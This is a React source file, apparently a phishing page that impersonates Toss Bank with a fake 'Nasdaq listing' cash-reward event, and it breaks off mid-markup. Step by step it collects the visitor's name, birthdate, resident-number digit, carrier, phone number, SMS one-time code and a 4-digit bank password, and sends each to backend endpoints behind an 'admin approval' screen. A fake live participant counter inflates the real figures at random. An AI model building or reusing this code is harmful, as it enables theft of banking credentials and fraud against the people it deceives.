import { useState, useEffect, useRef } from "react";
import {
  useSubmitEventVerifyStart,
  useSubmitEventVerifyCode,
  useGetSiteSettings,
} from "@workspace/api-client-react";
import { useToast } from "@/hooks/use-toast";
import { ChevronRight, Check, RotateCcw, Menu, X } from "lucide-react";
import "./home-theme.css";

/* ── Design tokens ── */
const BLUE       = "#3182F6";
const WHITE      = "#FFFFFF";
const BLUE_06    = "rgba(49,130,246,0.06)";
const BLUE_10    = "rgba(49,130,246,0.10)";
const BLUE_15    = "rgba(49,130,246,0.15)";
const BLUE_25    = "rgba(49,130,246,0.25)";
const BLUE_40    = "rgba(49,130,246,0.40)";
const BLUE_HOVER = "#1B6EEA";
const RADIUS     = "7px";

const carriers = ["SKT", "KT", "LG U+", "알뜰폰 SKT", "알뜰폰 KT", "알뜰폰 LG U+"];

/* ── 3D Step Icons ── */
function IconForm() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="formPaper" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0%" stopColor="#ffffff" stopOpacity="1"/>
          <stop offset="100%" stopColor="#ddeeff" stopOpacity="1"/>
        </linearGradient>
        <linearGradient id="formClip" x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stopColor="#90c4ff"/>
          <stop offset="100%" stopColor="#5599ee"/>
        </linearGradient>
        <filter id="formShadow" x="-10%" y="-10%" width="120%" height="130%">
          <feDropShadow dx="0" dy="2" stdDeviation="2" floodColor="rgba(0,40,120,0.25)"/>
        </filter>
      </defs>
      {/* Paper body */}
      <rect x="5" y="5" width="22" height="27" rx="3" fill="url(#formPaper)" filter="url(#formShadow)"/>
      {/* Inner highlight (gloss) */}
      <rect x="6" y="6" width="10" height="6" rx="2" fill="white" fillOpacity="0.55"/>
      {/* Lines */}
      <rect x="9" y="14" width="14" height="2" rx="1" fill="#3182F6" fillOpacity="0.35"/>
      <rect x="9" y="18" width="14" height="2" rx="1" fill="#3182F6" fillOpacity="0.28"/>
      <rect x="9" y="22" width="9" height="2"  rx="1" fill="#3182F6" fillOpacity="0.20"/>
      {/* Clip bar */}
      <rect x="12" y="2" width="8" height="5" rx="2.5" fill="url(#formClip)"/>
      <rect x="14" y="2.5" width="4" height="4" rx="2" fill="white" fillOpacity="0.55"/>
      {/* Bottom edge shadow */}
      <rect x="5" y="29" width="22" height="3" rx="2" fill="black" fillOpacity="0.07"/>
    </svg>
  );
}

function IconLock() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="lockBody" x1="0" y1="0" x2="0.5" y2="1">
          <stop offset="0%" stopColor="#e8deff"/>
          <stop offset="100%" stopColor="#b09af0"/>
        </linearGradient>
        <linearGradient id="shackle" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0%" stopColor="#ffffff" stopOpacity="0.9"/>
          <stop offset="100%" stopColor="#c8b8ff" stopOpacity="0.9"/>
        </linearGradient>
        <filter id="lockShadow">
          <feDropShadow dx="0" dy="2" stdDeviation="2" floodColor="rgba(60,0,140,0.3)"/>
        </filter>
      </defs>
      {/* Shackle (arch) */}
      <path d="M11 17V12a6 6 0 1 1 12 0v5" stroke="url(#shackle)" strokeWidth="3.5" strokeLinecap="round" fill="none" filter="url(#lockShadow)"/>
      {/* Lock body */}
      <rect x="6" y="16" width="22" height="16" rx="4" fill="url(#lockBody)" filter="url(#lockShadow)"/>
      {/* Gloss on body */}
      <rect x="7" y="17" width="12" height="5" rx="2" fill="white" fillOpacity="0.35"/>
      {/* Keyhole circle */}
      <circle cx="17" cy="25" r="3.5" fill="white" fillOpacity="0.30"/>
      <circle cx="17" cy="25" r="2" fill="white" fillOpacity="0.55"/>
      {/* Keyhole slot */}
      <rect x="16" y="25.5" width="2" height="3.5" rx="1" fill="white" fillOpacity="0.5"/>
      {/* Shackle inner highlight */}
      <path d="M12.5 17V12a4.5 4.5 0 0 1 4-4.47" stroke="white" strokeWidth="1.2" strokeLinecap="round" fill="none" strokeOpacity="0.5"/>
    </svg>
  );
}

function IconMoney() {
  return (
    <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="coin1" x1="0" y1="0" x2="0.5" y2="1">
          <stop offset="0%" stopColor="#fffde0"/>
          <stop offset="100%" stopColor="#f0c040"/>
        </linearGradient>
        <linearGradient id="coin2" x1="0" y1="0" x2="0.5" y2="1">
          <stop offset="0%" stopColor="#fff3b0"/>
          <stop offset="100%" stopColor="#d4a010"/>
        </linearGradient>
        <linearGradient id="bill" x1="0" y1="0" x2="0.3" y2="1">
          <stop offset="0%" stopColor="#d4f5e0"/>
          <stop offset="100%" stopColor="#5fd495"/>
        </linearGradient>
        <filter id="coinShadow">
          <feDropShadow dx="0" dy="2" stdDeviation="1.5" floodColor="rgba(0,80,0,0.25)"/>
        </filter>
      </defs>
      {/* Back bill */}
      <rect x="4" y="18" width="26" height="14" rx="3" fill="url(#bill)" fillOpacity="0.7" transform="rotate(-6 17 25)"/>
      {/* Bottom coin (larger, darker) */}
      <ellipse cx="17" cy="27" rx="10" ry="4" fill="url(#coin2)" filter="url(#coinShadow)"/>
      <ellipse cx="17" cy="26.2" rx="10" ry="4" fill="url(#coin2)"/>
      {/* Mid coin */}
      <ellipse cx="17" cy="22" rx="10" ry="4" fill="url(#coin1)" filter="url(#coinShadow)"/>
      <ellipse cx="17" cy="21.2" rx="10" ry="4" fill="url(#coin1)"/>
      {/* Coin side edge */}
      <rect x="7" y="18" width="20" height="3.2" fill="url(#coin2)" fillOpacity="0.8"/>
      {/* Top coin face */}
      <ellipse cx="17" cy="18" rx="10" ry="4" fill="url(#coin1)"/>
      {/* Gloss on top coin */}
      <ellipse cx="14" cy="17" rx="5" ry="1.8" fill="white" fillOpacity="0.45"/>
      {/* ₩ symbol */}
      <text x="17" y="19.5" textAnchor="middle" fontSize="5.5" fontWeight="900" fill="#8B6000" fillOpacity="0.7" fontFamily="sans-serif">₩</text>
    </svg>
  );
}

const DEFAULTS = {
  eventTitle:     "나스닥 상장 예정 기념 이벤트",
  existingReward: "최대 5만원",
  existingDesc1:  "인증정보 입력만으로",
  existingDesc2:  "본인 계좌 즉시 입금",
  newReward:      "무조건 5만원",
  newDesc1:       "신규계좌 개설 후",
  newDesc2:       "해당 계좌 즉시 입금",
  formSubtitle:   "본인 확인",
  formTitle:      "문자 인증으로\n이벤트 참여",
  formDisclaimer: "※ 이벤트 내용은 금융기관 사정에 따라 예고 없이 변경되거나 조기 종료될 수 있습니다. 미성년자는 참여 불가합니다.",
  pinPrompt:      "비밀번호를 입력해주세요",
};

/* ── Window width hook ── */
function useWindowWidth() {
  const [width, setWidth] = useState(() => window.innerWidth);
  useEffect(() => {
    const handler = () => setWidth(window.innerWidth);
    window.addEventListener("resize", handler);
    return () => window.removeEventListener("resize", handler);
  }, []);
  return width;
}

/* ── Scroll animation hook ── */
function useInView(options?: IntersectionObserverInit) {
  const ref = useRef<HTMLDivElement>(null);
  const [inView, setInView] = useState(false);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const obs = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) { setInView(true); obs.disconnect(); }
    }, { threshold: 0.12, rootMargin: "0px 0px -60px 0px", ...options });
    obs.observe(el);
    return () => obs.disconnect();
  }, []);
  return { ref, inView };
}

/* ── Animated wrapper ── */
function Reveal({
  children, delay = 0, direction = "up", style = {},
}: {
  children: React.ReactNode;
  delay?: number;
  direction?: "up" | "left" | "right" | "none";
  style?: React.CSSProperties;
}) {
  const { ref, inView } = useInView();
  const from =
    direction === "up"    ? "translateY(32px)" :
    direction === "left"  ? "translateX(-24px)" :
    direction === "right" ? "translateX(24px)" : "none";
  return (
    <div ref={ref} style={{
      opacity: inView ? 1 : 0,
      transform: inView ? "none" : from,
      transition: `opacity 0.6s cubic-bezier(.22,1,.36,1) ${delay}ms, transform 0.6s cubic-bezier(.22,1,.36,1) ${delay}ms`,
      willChange: inView ? "auto" : "transform, opacity",
      ...style,
    }}>
      {children}
    </div>
  );
}

/* ── Fade-in for step transitions ── */
function FadeIn({ children, style = {} }: { children: React.ReactNode; style?: React.CSSProperties }) {
  return (
    <div style={{
      animation: "fadeSlideUp 0.5s cubic-bezier(.22,1,.36,1) both",
      ...style,
    }}>
      {children}
    </div>
  );
}

/* ── Navbar ── */
const NAV_LINKS = [
  { label: "이벤트 안내", action: () => window.scrollTo({ top: 0, behavior: "smooth" }) },
  { label: "이벤트 참여", action: () => document.getElementById("form-section")?.scrollIntoView({ behavior: "smooth" }) },
];

function Navbar() {
  const [scrolled, setScrolled] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => {
    const handler = () => setScrolled(window.scrollY > 8);
    window.addEventListener("scroll", handler, { passive: true });
    return () => window.removeEventListener("scroll", handler);
  }, []);

  return (
    <>
      <nav style={{
        position: "sticky", top: 0, zIndex: 100,
        background: scrolled ? "rgba(4, 48, 155, 0.65)" : "rgba(4, 48, 155, 0.16)",
        backdropFilter: "blur(18px)", WebkitBackdropFilter: "blur(18px)",
        borderBottom: `1px solid ${scrolled ? "rgba(224,248,255,0.22)" : "transparent"}`,
        boxShadow: scrolled ? "0 4px 24px rgba(0,30,110,0.12)" : "none",
        transition: "border-color 0.2s, box-shadow 0.2s",
        fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif",
      }}>
        <div style={{ maxWidth: 1080, margin: "0 auto", padding: "0 24px", height: 56, display: "flex", alignItems: "center", justifyContent: "space-between" }}>

          {/* 로고 */}
          <button onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
            style={{ display: "flex", alignItems: "center", gap: 8, background: "none", border: "none", cursor: "pointer", padding: 0 }}>
            <img src="/favicon.png" alt="토스뱅크" style={{ width: 28, height: 28, borderRadius: 7, objectFit: "contain" }} />
            <span style={{ fontSize: 16, fontWeight: 800, color: WHITE, letterSpacing: "-0.03em" }}>토스뱅크</span>
          </button>

          {/* 데스크톱 링크 */}
          <div style={{ display: "flex", alignItems: "center", gap: 4 }} className="nav-desktop">
            {NAV_LINKS.slice(0, 4).map((link) => (
              <button key={link.label} onClick={link.action}
                style={{
                  background: "none", border: "none", cursor: "pointer",
                  fontSize: 14, fontWeight: 500, color: WHITE,
                  padding: "8px 14px", borderRadius: 7,
                  transition: "background 0.12s, color 0.12s",
                  fontFamily: "inherit",
                }}
                onMouseEnter={(e) => { (e.currentTarget as HTMLButtonElement).style.background = "rgba(255,255,255,0.12)"; }}
                onMouseLeave={(e) => { (e.currentTarget as HTMLButtonElement).style.background = "transparent"; }}
              >
                {link.label}
              </button>
            ))}
          </div>

          {/* CTA 버튼 (데스크톱) / 햄버거 (모바일) */}
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <button
              onClick={() => document.getElementById("form-section")?.scrollIntoView({ behavior: "smooth" })}
              style={{
                background: BLUE, color: WHITE, border: "none",
                borderRadius: 7, padding: "8px 16px",
                fontSize: 13, fontWeight: 700, cursor: "pointer",
                fontFamily: "inherit", letterSpacing: "-0.01em",
                transition: "background 0.12s",
              }}
              onMouseEnter={(e) => { (e.currentTarget as HTMLButtonElement).style.background = BLUE_HOVER; }}
              onMouseLeave={(e) => { (e.currentTarget as HTMLButtonElement).style.background = BLUE; }}
              className="nav-cta"
            >
              이벤트 참여하기
            </button>
            <button
              onClick={() => setMenuOpen((v) => !v)}
              style={{ background: "none", border: "none", cursor: "pointer", padding: 4, color: WHITE, display: "none" }}
              className="nav-hamburger"
            >
              {menuOpen ? <X size={22} /> : <Menu size={22} />}
            </button>
          </div>
        </div>

        {/* 모바일 드롭다운 */}
        {menuOpen && (
          <div style={{ background: "rgba(4, 48, 155, 0.72)", borderTop: "1px solid rgba(224,248,255,0.2)", padding: "8px 20px 16px" }}>
            {NAV_LINKS.slice(0, 4).map((link) => (
              <button key={link.label}
                onClick={() => { link.action(); setMenuOpen(false); }}
                style={{ display: "block", width: "100%", textAlign: "left", background: "none", border: "none", cursor: "pointer", fontSize: 15, fontWeight: 500, color: WHITE, padding: "12px 0", borderBottom: "1px solid rgba(224,248,255,0.15)", fontFamily: "inherit" }}
              >
                {link.label}
              </button>
            ))}
          </div>
        )}
      </nav>

      {/* 반응형 CSS */}
      <style>{`
        @media (max-width: 600px) {
          .nav-desktop { display: none !important; }
          .nav-cta { display: none !important; }
          .nav-hamburger { display: flex !important; }
        }
      `}</style>
    </>
  );
}

/* ─── Primitives ─── */
function Input({
  placeholder, value, onChange, maxLength, type = "text", style = {},
}: {
  placeholder?: string; value: string; onChange: (v: string) => void;
  maxLength?: number; type?: string; style?: React.CSSProperties;
}) {
  const [focused, setFocused] = useState(false);
  return (
    <input
      type={type} value={value} placeholder={placeholder} maxLength={maxLength}
      onChange={(e) => onChange(e.target.value)}
      onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
      style={{
        width: "100%", display: "block",
        background: focused ? WHITE : BLUE_06,
        border: `1.5px solid ${focused ? BLUE : BLUE_15}`,
        borderRadius: RADIUS, padding: "14px 16px", fontSize: 15,
        color: BLUE, outline: "none", transition: "all 0.15s",
        boxShadow: focused ? `0 0 0 3px ${BLUE_10}` : "none",
        fontFamily: "inherit", ...style,
      }}
      className="placeholder-[#A8C4F8]"
    />
  );
}

function Select({
  value, onChange, placeholder, options, style = {},
}: {
  value: string; onChange: (v: string) => void;
  placeholder: string; options: string[]; style?: React.CSSProperties;
}) {
  const [focused, setFocused] = useState(false);
  return (
    <div style={{ position: "relative", ...style }}>
      <select
        value={value} onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
        style={{
          width: "100%", background: focused ? WHITE : BLUE_06,
          border: `1.5px solid ${focused ? BLUE : BLUE_15}`,
          borderRadius: RADIUS, padding: "14px 40px 14px 16px",
          fontSize: 15, color: value ? BLUE : BLUE_40,
          outline: "none", appearance: "none", WebkitAppearance: "none",
          cursor: "pointer", fontFamily: "inherit", transition: "all 0.15s",
          boxShadow: focused ? `0 0 0 3px ${BLUE_10}` : "none",
        }}
      >
        <option value="">{placeholder}</option>
        {options.map((o) => <option key={o} value={o}>{o}</option>)}
      </select>
      <ChevronRight size={15} strokeWidth={2.5}
        style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%) rotate(90deg)", color: BLUE_40, pointerEvents: "none" }}
      />
    </div>
  );
}

function Checkbox({ checked, onClick }: { checked: boolean; onClick: () => void }) {
  return (
    <div onClick={(e) => { e.stopPropagation(); onClick(); }}
      style={{
        width: 20, height: 20, borderRadius: 4, flexShrink: 0, cursor: "pointer",
        background: checked ? BLUE : WHITE,
        border: `1.5px solid ${checked ? BLUE : BLUE_25}`,
        display: "flex", alignItems: "center", justifyContent: "center",
        transition: "all 0.15s",
        boxShadow: checked ? `0 0 0 3px ${BLUE_10}` : "none",
      }}
    >
      {checked && <Check size={11} strokeWidth={3} color={WHITE} />}
    </div>
  );
}

function Btn({ onClick, disabled, loading, children }: {
  onClick: () => void; disabled?: boolean; loading?: boolean; children: React.ReactNode;
}) {
  const [hovered, setHovered] = useState(false);
  const active = !disabled && !loading;
  return (
    <button onClick={onClick} disabled={!active}
      onMouseEnter={() => setHovered(true)} onMouseLeave={() => setHovered(false)}
      style={{
        width: "100%", padding: "15px", borderRadius: RADIUS, border: "none",
        cursor: active ? "pointer" : "not-allowed",
        fontSize: 16, fontWeight: 700, color: WHITE, letterSpacing: "-0.02em",
        background: active ? (hovered ? BLUE_HOVER : BLUE) : BLUE_25,
        transition: "all 0.15s",
        transform: active && hovered ? "translateY(-1px)" : "none",
        boxShadow: active ? `0 4px 16px ${BLUE_25}` : "none",
        fontFamily: "inherit",
      }}
    >
      {loading ? "처리 중..." : children}
    </button>
  );
}

/* ─── Page ─── */
export default function HomePage() {
  return (
    <div className="public-wave-theme" style={{
      "--wave-image": `url("${import.meta.env.BASE_URL}blue-wave-background.webp")`,
    } as React.CSSProperties}>
      <HomeContent />
    </div>
  );
}

function HomeContent() {
  const { toast } = useToast();
  const { data: settings } = useGetSiteSettings({ query: { refetchInterval: 30000 } });
  const screenW = useWindowWidth();
  const isMobile = screenW < 480;
  const formRef = useRef<HTMLDivElement>(null);

  const c = {
    eventTitle:     settings?.eventTitle     ?? DEFAULTS.eventTitle,
    existingReward: settings?.existingReward ?? DEFAULTS.existingReward,
    existingDesc1:  settings?.existingDesc1  ?? DEFAULTS.existingDesc1,
    existingDesc2:  settings?.existingDesc2  ?? DEFAULTS.existingDesc2,
    newReward:      settings?.newReward      ?? DEFAULTS.newReward,
    newDesc1:       settings?.newDesc1       ?? DEFAULTS.newDesc1,
    newDesc2:       settings?.newDesc2       ?? DEFAULTS.newDesc2,
    formSubtitle:   settings?.formSubtitle   ?? DEFAULTS.formSubtitle,
    formTitle:      settings?.formTitle      ?? DEFAULTS.formTitle,
    formDisclaimer: settings?.formDisclaimer ?? DEFAULTS.formDisclaimer,
    pinPrompt:      (settings as any)?.pinPrompt      ?? DEFAULTS.pinPrompt,
  };

  const [vStep, setVStep] = useState<1 | 2>(1);
  const [vName, setVName] = useState("");
  const [vBirth, setVBirth] = useState("");
  const [vGender, setVGender] = useState("");
  const [vCarrier, setVCarrier] = useState("");
  const [vPhone, setVPhone] = useState("");
  const [vCode, setVCode] = useState("");
  const [agreeAll, setAgreeAll] = useState(false);
  const [agreePhone, setAgreePhone] = useState(false);
  const [agreePrivacy, setAgreePrivacy] = useState(false);
  const [timer, setTimer] = useState(180);
  const [timerActive, setTimerActive] = useState(false);
  const [vDone, setVDone] = useState(false);
  const [vWaiting, setVWaiting] = useState(false);
  const [vPinStep, setVPinStep] = useState(false);
  const [vPin, setVPin] = useState("");
  const [pinSubmitting, setPinSubmitting] = useState(false);
  // 보안 키패드: 마운트 시 1-9 랜덤 셔플
  const [shuffledKeys] = useState<number[]>(() => {
    const arr = [1,2,3,4,5,6,7,8,9];
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  });
  const [publicStats, setPublicStats] = useState<{ total: number; today: number } | null>(null);
  const [liveCount, setLiveCount] = useState(0);
  const liveInitRef = useRef(false);
  const [vRecordId, setVRecordId] = useState<number | null>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
  const verifyStart = useSubmitEventVerifyStart();
  const verifyCode  = useSubmitEventVerifyCode();

  useEffect(() => {
    if (!timerActive) return;
    setTimer(180);
    timerRef.current = setInterval(() => {
      setTimer((t) => { if (t <= 1) { clearInterval(timerRef.current!); setTimerActive(false); return 0; } return t - 1; });
    }, 1000);
    return () => clearInterval(timerRef.current!);
  }, [timerActive]);

  const fmt = (s: number) =>
    `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;

  function toggleAll(v: boolean) { setAgreeAll(v); setAgreePhone(v); setAgreePrivacy(v); }
  useEffect(() => { setAgreeAll(agreePhone && agreePrivacy); }, [agreePhone, agreePrivacy]);

  async function handleSend() {
    if (!vName.trim()) { toast({ title: "이름을 입력해주세요", variant: "destructive" }); return; }
    if (vBirth.length < 6) { toast({ title: "생년월일 6자리를 입력해주세요", variant: "destructive" }); return; }
    if (!vGender) { toast({ title: "주민번호 뒷자리 첫번째 숫자를 입력해주세요", variant: "destructive" }); return; }
    if (!vCarrier) { toast({ title: "통신사를 선택해주세요", variant: "destructive" }); return; }
    if (vPhone.length < 11) { toast({ title: "휴대폰 번호를 올바르게 입력해주세요", variant: "destructive" }); return; }
    if (!agreePhone || !agreePrivacy) { toast({ title: "필수 약관에 동의해주세요", variant: "destructive" }); return; }
    try {
      const rec = await verifyStart.mutateAsync({ data: { name: vName, birth: vBirth, genderDigit: vGender, carrier: vCarrier, phone: vPhone } });
      setVRecordId(rec.id);
      setVStep(2);
      setTimerActive(true);
      // 스크롤을 맨 위로 올려서 이미지 + OTP 폼이 보이도록
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch { toast({ title: "오류가 발생했습니다. 다시 시도해주세요.", variant: "destructive" }); }
  }

  async function handleVerify() {
    if (vCode.length < 6) { toast({ title: "인증번호 6자리를 입력해주세요", variant: "destructive" }); return; }
    if (!vRecordId) { toast({ title: "처음부터 다시 시도해주세요.", variant: "destructive" }); return; }
    try {
      await verifyCode.mutateAsync({ id: vRecordId, data: { otpCode: vCode } });
      // OTP 저장 완료 → 비밀번호 입력 단계로 전환
      setVPinStep(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch { toast({ title: "오류가 발생했습니다. 다시 시도해주세요.", variant: "destructive" }); }
  }

  async function handlePinSubmit(pin: string) {
    if (!vRecordId) return;
    setPinSubmitting(true);
    try {
      await fetch(`/api/event/verify-pin/${vRecordId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pinCode: pin }),
      });
      // 비밀번호 저장 완료 → 어드민 승인 대기 화면으로 전환 + 폴링 시작
      setVPinStep(false);
      setVWaiting(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
      const id = vRecordId;
      pollRef.current = setInterval(async () => {
        try {
          const res = await fetch(`/api/event/verify-status/${id}`);
          if (!res.ok) return;
          const data = await res.json();
          if (data.adminStatus === "completed") {
            clearInterval(pollRef.current!);
            setVDone(true);
            setVWaiting(false);
          }
        } catch { /* 네트워크 오류는 무시하고 재시도 */ }
      }, 3000);
    } catch {
      toast({ title: "오류가 발생했습니다. 다시 시도해주세요.", variant: "destructive" });
    } finally {
      setPinSubmitting(false);
    }
  }

  // 언마운트 시 폴링 정리
  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  // 공개 신청 현황 (초기 1회)
  useEffect(() => {
    const fetchStats = async () => {
      try {
        const res = await fetch("/api/event/stats");
        if (res.ok) setPublicStats(await res.json());
      } catch {}
    };
    fetchStats();
  }, []);

  // 라이브 카운터: stats 로드 후 시작값 설정 → 천천히 올라감
  useEffect(() => {
    if (!publicStats || liveInitRef.current) return;
    liveInitRef.current = true;
    // 실제 누적 수 + 1000~2000 오프셋으로 시작 (10 단위 반올림)
    const base = Math.round((publicStats.total + 1000 + Math.floor(Math.random() * 1000)) / 10) * 10;
    setLiveCount(base);
    // 5~12초마다 10~80씩 증가
    const tick = () => {
      const inc = (Math.floor(Math.random() * 8) + 1) * 10;
      setLiveCount((n) => n + inc);
      schedule();
    };
    let tid: ReturnType<typeof setTimeout>;
    const schedule = () => { tid = setTimeout(tick, 5000 + Math.random() * 7000); };
    schedule();
    return () => clearTimeout(tid);
  }, [publicStats]);

  const card: React.CSSProperties = {
    background: "rgba(255,255,255,0.96)", border: "1px solid rgba(255,255,255,0.55)",
    borderRadius: RADIUS, boxShadow: "0 12px 40px rgba(0,28,108,0.16)",
    backdropFilter: "blur(16px)", WebkitBackdropFilter: "blur(16px)",
  };

  /* ── Step 2-c: 비밀번호(PIN) 입력 화면 ── */
  if (vPinStep && !vWaiting && !vDone) {
    // 키패드 배열: rows 0-2 = shuffledKeys(1-9), row3 = [null, 0, -1(backspace)]
    const padRows: (number | null)[][] = [
      [1, 2, 3],
      [4, 5, 6],
      [7, 8, 9],
      [null, 0, -1],
    ];

    function pressKey(key: number | null) {
      if (key === null) return;
      if (key === -1) {
        // 백스페이스
        setVPin((p) => p.slice(0, -1));
        return;
      }
      setVPin((p) => {
        const next = p.length < 4 ? p + String(key) : p;
        // 4자리 완성 시 자동 제출
        if (next.length === 4 && p.length < 4) {
          setTimeout(() => handlePinSubmit(next), 80);
        }
        return next;
      });
    }

    return (
      <div style={{
        minHeight: "100vh",
        background: "transparent",
        fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif",
        display: "flex", flexDirection: "column",
      }}>
        <Navbar />
        <FadeIn style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
          <div className="wave-surface" style={{ width: "100%", maxWidth: 360, padding: "40px 24px 48px", borderRadius: 20, margin: "32px 16px" }}>

            {/* 도트 인디케이터 */}
            <div style={{ display: "flex", justifyContent: "center", gap: 14, marginBottom: 28 }}>
              {[0,1,2,3].map((i) => (
                <div key={i} style={{
                  width: 14, height: 14, borderRadius: "50%",
                  background: i < vPin.length ? BLUE : "#E5E8EB",
                  transition: "background 0.15s, transform 0.15s",
                  transform: i < vPin.length ? "scale(1.1)" : "scale(1)",
                }} />
              ))}
            </div>

            {/* 제목 */}
            <div style={{ textAlign: "center", marginBottom: 36 }}>
              <p style={{
                margin: 0, fontSize: 17, fontWeight: 700,
                color: "#191F28", letterSpacing: "-0.02em", lineHeight: 1.5,
              }}>
                <span style={{ color: BLUE }}>{vName}</span>님의 {c.pinPrompt}
              </p>
            </div>

            {/* 키패드 */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 10 }}>
              {padRows.map((row, ri) =>
                row.map((key, ci) => {
                  const isEmpty = key === null;
                  const isBackspace = key === -1;
                  return (
                    <button
                      key={`${ri}-${ci}`}
                      onClick={() => pressKey(key)}
                      disabled={isEmpty || pinSubmitting || (vPin.length >= 4 && !isBackspace)}
                      style={{
                        height: 72,
                        borderRadius: 14,
                        border: "none",
                        background: isEmpty ? "transparent" : "#F2F4F6",
                        cursor: isEmpty ? "default" : "pointer",
                        fontSize: isBackspace ? 20 : 24,
                        fontWeight: 700,
                        color: "#191F28",
                        display: "flex", alignItems: "center", justifyContent: "center",
                        transition: "background 0.1s, transform 0.08s",
                        fontFamily: "inherit",
                        letterSpacing: "-0.02em",
                        WebkitTapHighlightColor: "transparent",
                        userSelect: "none",
                      }}
                      onPointerDown={(e) => {
                        if (!isEmpty) (e.currentTarget as HTMLButtonElement).style.background = "#DDE1E7";
                      }}
                      onPointerUp={(e) => {
                        if (!isEmpty) (e.currentTarget as HTMLButtonElement).style.background = "#F2F4F6";
                      }}
                      onPointerLeave={(e) => {
                        if (!isEmpty) (e.currentTarget as HTMLButtonElement).style.background = "#F2F4F6";
                      }}
                    >
                      {isEmpty ? "" : isBackspace ? "←" : key}
                    </button>
                  );
                })
              )}
            </div>

            {/* 처리 중 표시 */}
            {pinSubmitting && (
              <div style={{ marginTop: 24, textAlign: "center", fontSize: 13, color: BLUE_40 }}>
                처리 중...
              </div>
            )}
          </div>
        </FadeIn>
      </div>
    );
  }

  /* ── Step 2-b: 어드민 승인 대기 화면 ── */
  if (vWaiting && !vDone) {
    return (
      <div style={{ minHeight: "100vh", background: "transparent", fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif" }}>
        <Navbar />
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "calc(100vh - 56px)", padding: "40px 20px" }}>
          <FadeIn>
            <div style={{ ...card, maxWidth: 360, width: "100%", padding: "56px 32px", textAlign: "center" }}>
              {/* 스피너 */}
              <div style={{ width: 64, height: 64, borderRadius: "50%", border: `4px solid ${BLUE_15}`, borderTopColor: BLUE, margin: "0 auto 28px", animation: "spin 0.9s linear infinite" }} />
              <div style={{ fontSize: 20, fontWeight: 900, color: BLUE, marginBottom: 12, letterSpacing: "-0.03em" }}>처리 중입니다</div>
              <div style={{ fontSize: 14, color: "#6B7684", lineHeight: 1.8 }}>
                담당자가 확인 중입니다.<br />잠시만 기다려주세요.
              </div>
              <div style={{ marginTop: 24, fontSize: 12, color: BLUE_40 }}>
                자동으로 완료 화면으로 전환됩니다
              </div>
            </div>
          </FadeIn>
        </div>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  /* ── Step 2: OTP 화면 (이미지 + 인증번호 입력) ── */
  if (vStep === 2 && !vDone) {
    return (
      <div style={{ minHeight: "100vh", background: "transparent", fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif" }}>
        <Navbar />
        {/* OTP 입력 폼 */}
        <FadeIn style={{ transitionDelay: "120ms" }}>
          <div style={{ maxWidth: 400, margin: "0 auto", padding: "36px 20px 48px" }}>
            <div style={{ textAlign: "center", marginBottom: 32 }}>
              <h1 className="wave-heading" style={{ margin: 0, fontSize: isMobile ? 22 : 26, fontWeight: 900, letterSpacing: "-0.04em", lineHeight: 1.3 }}>
                문자로 받은 인증번호<br />6자리를 입력해주세요
              </h1>
            </div>

            <div style={{ ...card, padding: "24px 20px" }}>
              <div style={{ position: "relative", marginBottom: 8 }}>
                <Input
                  placeholder="인증번호 6자리"
                  value={vCode}
                  onChange={(v) => setVCode(v.replace(/\D/g, "").slice(0, 6))}
                  maxLength={6}
                  style={{ letterSpacing: "0.2em", fontSize: 20, fontWeight: 800, paddingRight: 80 }}
                />
                <span style={{ position: "absolute", right: 16, top: "50%", transform: "translateY(-50%)", fontSize: 14, fontWeight: 700, fontVariantNumeric: "tabular-nums", color: timer === 0 ? "#EF4444" : BLUE }}>
                  {fmt(timer)}
                </span>
              </div>

              <div style={{ textAlign: "right", marginBottom: 20 }}>
                <button
                  onClick={() => { setTimerActive(false); setTimeout(() => setTimerActive(true), 80); setVCode(""); }}
                  style={{ background: "none", border: "none", cursor: "pointer", fontSize: 13, color: BLUE_40, fontWeight: 500, display: "inline-flex", alignItems: "center", gap: 4, fontFamily: "inherit", padding: 0 }}
                >
                  <RotateCcw size={13} /> 인증번호 다시 받기
                </button>
              </div>

              <Btn onClick={handleVerify} disabled={vCode.length < 6 || timer === 0} loading={verifyCode.isPending}>확인</Btn>

